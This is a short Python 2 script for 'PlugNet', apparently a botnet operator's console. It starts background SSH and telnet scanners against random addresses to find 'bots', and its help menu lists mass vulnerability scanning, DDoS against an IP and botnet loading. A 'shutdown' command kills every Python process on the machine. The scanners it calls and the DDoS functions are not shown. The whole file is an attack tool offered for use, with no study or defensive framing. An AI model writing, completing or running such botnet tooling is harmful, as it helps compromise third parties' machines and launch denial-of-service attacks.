import sys
import os
print '''
     *
  _____________ 
  |           |
  |  PLUGNET  |  *
  |___________|
 
      *
  [Fuckthepopulation]

'''
import subprocess

while True:
	cmd = raw_input("~PlugNet$")
	if cmd == ('list'):
		print('ight bet')
	elif cmd == ('scan_ssh'):
		threads = raw_input("Threads: ")
		subprocess.Popen(["python","sshscan.py", threads, "random", "1", "10"])
		print(" [+] ~Running background ssh scan~ [+]")
	elif cmd == ('scan'):
		threads = raw_input("Threads: ")
		subprocess.Popen(["python","sshscan.py", threads, "random", "1", "10"])
		subprocess.Popen(["python","telnetscan.py", threads])
		print(" [+] ~Finding bots~ [+]")
	elif cmd == ('shutdown'):
		print('bye g')
		os.system('killall python')
		sys.exit(5)
	elif cmd == (''):
		pass
	else:
		print'''
	Commands:
	   list - lists all scanned
	   scan - scans for any bot type
	   scan_ssh - search for ssh bots
	   scan_telnet -search for telnet bots
	   ftp - mass scan all vulns
	   ddos - ddos ip with bots
	   load - load botnet with file dir

'''

